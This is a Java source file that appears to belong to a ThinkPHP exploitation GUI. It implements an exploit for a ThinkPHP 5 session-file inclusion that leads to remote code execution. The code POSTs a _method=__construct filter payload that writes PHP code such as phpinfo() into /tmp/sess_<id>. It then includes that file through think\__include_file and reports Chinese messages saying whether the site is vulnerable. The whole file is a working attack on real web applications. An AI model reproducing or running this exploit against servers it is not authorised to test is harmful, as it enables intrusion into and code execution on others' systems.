package exploit;

import com.example.thinkphpgui.ConfigManager;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.stream.Stream;


public class Tp5_PHPSESSID_Lfi_Rce implements Exploit {
    private final ConfigManager configManager = ConfigManager.getInstance();

    @Override
    public void startScan(String url) {
        String phpsessid = UUID.randomUUID().toString().replace("-", "");
        int number = (int) (Math.random() * 900000) + 100000;
        ;

        String payload = "<?=" + number + ";?>";
        writeToLogFile(url, phpsessid, payload);
        if (includeLogFile(url, phpsessid, number)) {
            return;
        }


        phpsessid = UUID.randomUUID().toString().replace("-", "");
        writeToLogFile(url, phpsessid, "<?=phpinfo()?>");//第二种payload
        if (includeLogFile(url, phpsessid, number)) {
            return;
        }

        configManager.appendToTextArea("[-] " + url + "  不存在Tp5 session 文件包含漏洞");

    }


    private void writeToLogFile(String url, String phpsessid, String payload) {//将php代码写入日志

        for (String module : ConfigManager.moduleList) {
            try {
                HttpURLConnection httpURLConnection = HttpRequestUtil.post(url + "?s=" + module);
                httpURLConnection.setRequestProperty("Cookie", "PHPSESSID=" + phpsessid);
                httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                httpURLConnection.setDoOutput(true);

                // 4. 发送 POST 数据

                String postData = String.format("_method=__construct&filter[]=think\\Session::set&method=GET&get[]=%s", payload);
                try (OutputStream os = httpURLConnection.getOutputStream()) {
                    os.write(postData.getBytes(StandardCharsets.UTF_8));
                }

                int responseCode = httpURLConnection.getResponseCode();

            } catch (Exception e) {

            }
        }

    }

    private Boolean includeLogFile(String url, String phpsessid, int number) {
        for (String module : ConfigManager.moduleList) {
            try {
                HttpURLConnection httpURLConnection = HttpRequestUtil.post(url + "?s=" + module);
                httpURLConnection.setDoOutput(true);
                httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                String postData = String.format("_method=__construct&filter[]=think\\__include_file&method=GET&get[]=/tmp/sess_%s", phpsessid);

                try (OutputStream outputStream = httpURLConnection.getOutputStream()) {
                    outputStream.write(postData.getBytes(StandardCharsets.UTF_8));
                }
                BufferedReader bufferedReader;
                int code = httpURLConnection.getResponseCode();

                if (code >= 400) {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                }

                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    if (Stream.of("PHP Version", "PHP Core", "PHP Variables", String.valueOf(number)).anyMatch(line::contains)) {
                        configManager.appendToTextArea("[+] " + url + "   存在Tp5 session 文件包含漏洞");
                        return true;
                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return false;
    }

}